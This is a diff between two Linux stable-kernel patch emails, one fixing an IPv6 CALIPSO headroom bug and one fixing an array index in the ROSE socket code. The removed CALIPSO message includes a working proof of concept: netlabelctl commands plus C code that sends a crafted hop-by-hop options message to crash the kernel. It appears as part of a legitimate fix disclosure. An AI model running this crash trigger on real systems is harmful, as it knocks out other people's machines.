@@ -1,52 +1,52 @@
-Return-Path: <stable+bounces-205787-lists+stable=lfdr.de@vger.kernel.org>
+Return-Path: <stable+bounces-205756-lists+stable=lfdr.de@vger.kernel.org>
 X-Original-To: lists+stable@lfdr.de
 Delivered-To: lists+stable@lfdr.de
-Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
-	by mail.lfdr.de (Postfix) with ESMTPS id D9918CFA992
-	for <lists+stable@lfdr.de>; Tue, 06 Jan 2026 20:22:18 +0100 (CET)
+Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
+	by mail.lfdr.de (Postfix) with ESMTPS id E4F9BCFA880
+	for <lists+stable@lfdr.de>; Tue, 06 Jan 2026 20:15:42 +0100 (CET)
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by sea.lore.kernel.org (Postfix) with ESMTP id 580AB3539D56
-	for <lists+stable@lfdr.de>; Tue,  6 Jan 2026 18:34:50 +0000 (UTC)
+	by sea.lore.kernel.org (Postfix) with ESMTP id A6F6830389AF
+	for <lists+stable@lfdr.de>; Tue,  6 Jan 2026 18:26:46 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 92EDF36403D;
-	Tue,  6 Jan 2026 17:51:01 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 5D1E235FF63;
+	Tue,  6 Jan 2026 17:49:16 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="sGNc4VpT"
+	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="DeJe6HdA"
 X-Original-To: stable@vger.kernel.org
 Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4947636403F;
-	Tue,  6 Jan 2026 17:51:01 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 19873355031;
+	Tue,  6 Jan 2026 17:49:15 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1767721861; cv=none; b=hqvC7cllCRMYku+0TbwRWRyl/Js1gNVgCo5Hnk9sZ1XcGL5PLLpF/8X4C28OZbAT2X/4yZ+zGuSTvpdKxiStSAJNzxeJiakbh2eK8lZPyX9jD0Cc7UwV1nueC24NSEZ39Jp32th/7H/ql4hp9v9iHifqNZQIGRqcRopz1CRjIk4=
+	t=1767721756; cv=none; b=twT+JsZrz7gLwHdIARYjqceCttQYfgRh5Gkm7KeURd4vuplZwTMcqZoAJTh7VHgRnotIZI24RqXWMp5dRdypvkuIkLGTyZecssOMtJXhRCglBIhK+dyauZNPxK+mDQb9spiD042rY4OV46HNugwgVIKrec0KSclIRlJPvqsFNZ0=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1767721861; c=relaxed/simple;
-	bh=F7LKzK51wcnKCO5qgC0TSy/LxMG4aFVAn01cOi3HEUU=;
+	s=arc-20240116; t=1767721756; c=relaxed/simple;
+	bh=1X7/dAPq6/5voaT6tOYbcat71nCBiKUMJ7r8c31bAbg=;
 	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version; b=u2aXGcSFntKxgixl/AY3SQv9vYXd1u9NQNTwyHftGmPxHoIC03nuAQrkq22dBX27GRqxBePCgBb8+f+KppvzfqpCnNdxqyyX1O72jROGYOMUMwbyOMuWH/aEk5v0/HwXhhYW7jKnub55Dk9k8uehVpzlJFHPICL6IsOka/I/9KY=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=sGNc4VpT; arc=none smtp.client-ip=10.30.226.201
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 9B64EC116C6;
-	Tue,  6 Jan 2026 17:51:00 +0000 (UTC)
+	 MIME-Version; b=M/3s2XIk6C4fMp5EpzcIf9+QgsdQ6aEQRIeXSsNk7vbpV2NY7vQuRVZOgk29UTMgLo49+3f7hQChDTzoOqItAn9GMlLfEtO8TCZtHGRc+RF1s0kJYZ/FK5HTZDrPFs4yQXp660XzaUobrEE+LEj13JeENqOgf5wbDw67+Kuc0LQ=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=DeJe6HdA; arc=none smtp.client-ip=10.30.226.201
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id 22473C116C6;
+	Tue,  6 Jan 2026 17:49:14 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
-	s=korg; t=1767721861;
-	bh=F7LKzK51wcnKCO5qgC0TSy/LxMG4aFVAn01cOi3HEUU=;
+	s=korg; t=1767721755;
+	bh=1X7/dAPq6/5voaT6tOYbcat71nCBiKUMJ7r8c31bAbg=;
 	h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
-	b=sGNc4VpTp6H3qUmxmhW1vaOGTp926FEAK034YKAPTjHYAaGYmppahDi4Z8RTXhp9n
-	 mx6Lczpp17+Y0nGUGIfkFs/yop17eBqXwEvGQBRblthQ61rfy4GDXI6/09rU1nIcod
-	 5w+imYp7QeXSsjH1LMl2OUGMuLyXbXEZFqaO3mp8=
+	b=DeJe6HdAo/wgQO9QNEP6lZqDcI3uqRg+oilVrK8+3WsA3Wh9HdgLF3GwnSMweq4SW
+	 oHxlTK9T3OU2Fu9Jj9PqzkwgL9mgd3RwlluG8t9ycDxPeLUCLYfgcEVz46Ok+2W0D3
+	 4s/mL/rRS3gz0O1UWcksPdD0t+GxljpvKQGqNIyg=
 From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 To: stable@vger.kernel.org
 Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
 	patches@lists.linux.dev,
-	Paul Moore <paul@paul-moore.com>,
-	Will Rosenberg <whrosenb@asu.edu>,
+	Fatma Alwasmi <falwasmi@purdue.edu>,
+	Pwnverse <stanksal@purdue.edu>,
 	Paolo Abeni <pabeni@redhat.com>,
 	Sasha Levin <sashal@kernel.org>
-Subject: [PATCH 6.18 060/312] ipv6: BUG() in pskb_expand_head() as part of calipso_skbuff_setattr()
-Date: Tue,  6 Jan 2026 18:02:14 +0100
-Message-ID: <20260106170550.021856050@linuxfoundation.org>
+Subject: [PATCH 6.18 063/312] net: rose: fix invalid array index in rose_kill_by_device()
+Date: Tue,  6 Jan 2026 18:02:17 +0100
+Message-ID: <20260106170550.131060601@linuxfoundation.org>
 X-Mailer: git-send-email 2.52.0
 In-Reply-To: <20260106170547.832845344@linuxfoundation.org>
 References: <20260106170547.832845344@linuxfoundation.org>
@@ -65,95 +65,46 @@ Content-Transfer-Encoding: 8bit
 
 ------------------
 
-From: Will Rosenberg <whrosenb@asu.edu>
+From: Pwnverse <stanksal@purdue.edu>
 
-[ Upstream commit 58fc7342b529803d3c221101102fe913df7adb83 ]
+[ Upstream commit 6595beb40fb0ec47223d3f6058ee40354694c8e4 ]
 
-There exists a kernel oops caused by a BUG_ON(nhead < 0) at
-net/core/skbuff.c:2232 in pskb_expand_head().
-This bug is triggered as part of the calipso_skbuff_setattr()
-routine when skb_cow() is passed headroom > INT_MAX
-(i.e. (int)(skb_headroom(skb) + len_delta) < 0).
+rose_kill_by_device() collects sockets into a local array[] and then
+iterates over them to disconnect sockets bound to a device being brought
+down.
 
-The root cause of the bug is due to an implicit integer cast in
-__skb_cow(). The check (headroom > skb_headroom(skb)) is meant to ensure
-that delta = headroom - skb_headroom(skb) is never negative, otherwise
-we will trigger a BUG_ON in pskb_expand_head(). However, if
-headroom > INT_MAX and delta <= -NET_SKB_PAD, the check passes, delta
-becomes negative, and pskb_expand_head() is passed a negative value for
-nhead.
+The loop mistakenly indexes array[cnt] instead of array[i]. For cnt <
+ARRAY_SIZE(array), this reads an uninitialized entry; for cnt ==
+ARRAY_SIZE(array), it is an out-of-bounds read. Either case can lead to
+an invalid socket pointer dereference and also leaks references taken
+via sock_hold().
 
-Fix the trigger condition in calipso_skbuff_setattr(). Avoid passing
-"negative" headroom sizes to skb_cow() within calipso_skbuff_setattr()
-by only using skb_cow() to grow headroom.
+Fix the index to use i.
 
-PoC:
-	Using `netlabelctl` tool:
-
-        netlabelctl map del default
-        netlabelctl calipso add pass doi:7
-        netlabelctl map add default address:0::1/128 protocol:calipso,7
-
-        Then run the following PoC:
-
-        int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
-
-        // setup msghdr
-        int cmsg_size = 2;
-        int cmsg_len = 0x60;
-        struct msghdr msg;
-        struct sockaddr_in6 dest_addr;
-        struct cmsghdr * cmsg = (struct cmsghdr *) calloc(1,
-                        sizeof(struct cmsghdr) + cmsg_len);
-        msg.msg_name = &dest_addr;
-        msg.msg_namelen = sizeof(dest_addr);
-        msg.msg_iov = NULL;
-        msg.msg_iovlen = 0;
-        msg.msg_control = cmsg;
-        msg.msg_controllen = cmsg_len;
-        msg.msg_flags = 0;
-
-        // setup sockaddr
-        dest_addr.sin6_family = AF_INET6;
-        dest_addr.sin6_port = htons(31337);
-        dest_addr.sin6_flowinfo = htonl(31337);
-        dest_addr.sin6_addr = in6addr_loopback;
-        dest_addr.sin6_scope_id = 31337;
-
-        // setup cmsghdr
-        cmsg->cmsg_len = cmsg_len;
-        cmsg->cmsg_level = IPPROTO_IPV6;
-        cmsg->cmsg_type = IPV6_HOPOPTS;
-        char * hop_hdr = (char *)cmsg + sizeof(struct cmsghdr);
-        hop_hdr[1] = 0x9; //set hop size - (0x9 + 1) * 8 = 80
-
-        sendmsg(fd, &msg, 0);
-
-Fixes: 2917f57b6bc1 ("calipso: Allow the lsm to label the skbuff directly.")
-Suggested-by: Paul Moore <paul@paul-moore.com>
-Signed-off-by: Will Rosenberg <whrosenb@asu.edu>
-Acked-by: Paul Moore <paul@paul-moore.com>
-Link: https://patch.msgid.link/20251219173637.797418-1-whrosenb@asu.edu
+Fixes: 64b8bc7d5f143 ("net/rose: fix races in rose_kill_by_device()")
+Co-developed-by: Fatma Alwasmi <falwasmi@purdue.edu>
+Signed-off-by: Fatma Alwasmi <falwasmi@purdue.edu>
+Signed-off-by: Pwnverse <stanksal@purdue.edu>
+Link: https://patch.msgid.link/20251222212227.4116041-1-ritviktanksalkar@gmail.com
 Signed-off-by: Paolo Abeni <pabeni@redhat.com>
 Signed-off-by: Sasha Levin <sashal@kernel.org>
 ---
- net/ipv6/calipso.c | 3 ++-
- 1 file changed, 2 insertions(+), 1 deletion(-)
+ net/rose/af_rose.c | 2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
 
-diff --git a/net/ipv6/calipso.c b/net/ipv6/calipso.c
-index df1986973430..21f6ed126253 100644
---- a/net/ipv6/calipso.c
-+++ b/net/ipv6/calipso.c
-@@ -1342,7 +1342,8 @@ static int calipso_skbuff_setattr(struct sk_buff *skb,
- 	/* At this point new_end aligns to 4n, so (new_end & 4) pads to 8n */
- 	pad = ((new_end & 4) + (end & 7)) & 7;
- 	len_delta = new_end - (int)end + pad;
--	ret_val = skb_cow(skb, skb_headroom(skb) + len_delta);
-+	ret_val = skb_cow(skb,
-+			  skb_headroom(skb) + (len_delta > 0 ? len_delta : 0));
- 	if (ret_val < 0)
- 		return ret_val;
+diff --git a/net/rose/af_rose.c b/net/rose/af_rose.c
+index 543f9e8ebb69..fad6518e6e39 100644
+--- a/net/rose/af_rose.c
++++ b/net/rose/af_rose.c
+@@ -205,7 +205,7 @@ static void rose_kill_by_device(struct net_device *dev)
+ 	spin_unlock_bh(&rose_list_lock);
  
+ 	for (i = 0; i < cnt; i++) {
+-		sk = array[cnt];
++		sk = array[i];
+ 		rose = rose_sk(sk);
+ 		lock_sock(sk);
+ 		spin_lock_bh(&rose_list_lock);
 -- 
 2.51.0
 
